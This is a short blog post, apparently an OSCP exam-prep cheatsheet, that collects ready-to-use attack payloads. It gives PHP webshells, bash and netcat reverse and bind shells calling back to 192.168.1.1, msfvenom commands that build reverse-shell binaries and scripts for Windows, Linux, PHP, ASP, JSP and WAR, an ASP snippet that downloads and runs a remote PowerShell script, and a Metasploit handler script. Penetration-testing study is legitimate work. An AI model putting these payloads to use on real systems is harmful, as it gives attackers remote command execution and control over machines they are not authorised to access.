---
title: Payloads
author: linatl
category: "OSCP"
date: "2021-03-06 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Webshells
```
Kali ready-to-go webshells
/usr/share/webshells/
/usr/share/seclists/Web-Shells/

PHP code for a simple web shell:
<?=`$_GET[0]`?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php $cmd=$_GET['cmd']; system($cmd);?>

PHP to immediately pop a shell (linux-only)
<?php $sock=fsockopen("192.168.1.1",443); exec("/bin/sh -i <&3 >&3 2>&3");?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.1/443 0>&1'");?>
```

###### Pop a shell from command line
```
Bash
$ bash -i >& /dev/tcp/192.168.1.1/443 0>&1

Netcat
$ nc -e /bin/bash 192.168.1.1 443
```

###### Ready-to-go reverse shell payloads
```
Nishang
https://github.com/samratashok/nishang

PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings

Pentestmonkey Cheatsheet
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Shell Spawning with NetSec
https://netsec.ws/?p=337
```

###### List msfvenom payload options
```
$ msfvenom -l payloads | grep php
$ msfvenom -l archs
$ msfvenom -l formats
```

###### Windows payloads for in a python script
```
Unstaged payload
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -b "\x00" -f python -v shellcode -a x86 --platform windows > payload.txt

Staged payload
$ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=443 -b "\x00" -f python -v shellcode -a x86 --platform windows > payload.txt
```


###### .exe reverse shell
```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe > shell.exe
```

###### PHP reverse shell
```
$ msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=443 -f raw > shell.php

Need to add the <?php at the first line of the file so that it will execute as a PHP webpage.
```

###### .elf reverse shell
```
x86
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > shell.elf
x64
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > shell.elf
```

###### .sh reverse shell
```
$ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.1 LPORT=443 -f raw > shell.sh
```

###### Some more reverse shells
```
.asp
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f asp > shell.asp
.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f raw > shell.jsp
.war
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f war > shell.war
```

###### Simple ASP(X?) payload without importing additional libraries
```
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.10.10:80/InvokePowerShellTcp.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
>
```

###### Netcat reverse shell
```
Set up a listener
$ nc -nvlp 443

Connect to the listener (Windows)
$ nc -nv 192.168.1.1 443 -e cmd.exe
Connect to the listener (Linux)
$ nc -nv 192.168.1.1 443 -e /bin/bash
```

###### Netcat bind shell
```
Set up a listener (bind shell) (Windows target)
 $ nc -nvlp 10.10.10.10 443 -e cmd.exe
Set up a listener (bind shell) (Linux target)
 $ nc -nvlp 10.10.10.10 443 -e /bin/bash

Connect to the listener
$ nc -nv 192.168.1.1 443
```

###### Metasploit Multi Handler (.rc script)
```
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST 192.168.1.1
set LPORT 443
set ExitOnSession false
exploit -j -z
```
